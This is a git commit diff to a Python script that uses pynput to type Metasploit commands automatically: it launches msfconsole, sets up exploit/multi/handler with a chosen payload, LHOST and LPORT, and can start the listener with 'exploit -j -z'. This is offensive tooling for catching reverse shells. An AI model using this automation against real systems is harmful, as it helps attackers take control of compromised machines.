038574e25e038473a51fcb717cb98d2022a8db8a
Cameron Mkj <cameronmkj@gmail.com>
2018-02-05 03:52:40 +0000

    Added enter press.

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
 import os, time
-from pynput import Keyboard, Controller
+from pynput.keyboard import Key, Controller
 
 keyboard = Controller()
 
@@ -13,14 +13,26 @@ os.system("clear")
 exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
 exploitTwo = exploit.lower()
 
-os.system("msfconsole")
+keyboard.type("msfconsole")
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+time.sleep(10)
 keyboard.type("use exploit/multi/handler")
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
 keyboard.type("set payload " + payload)
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
 keyboard.type("set LHOST " + ip)
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
 keyboard.type("set lport " + port)
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
 if exploitTwo == "y":
     keyboard.type("exploit -j -z")
     keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
 elif exploitTwo == "n":
     pass
 else:
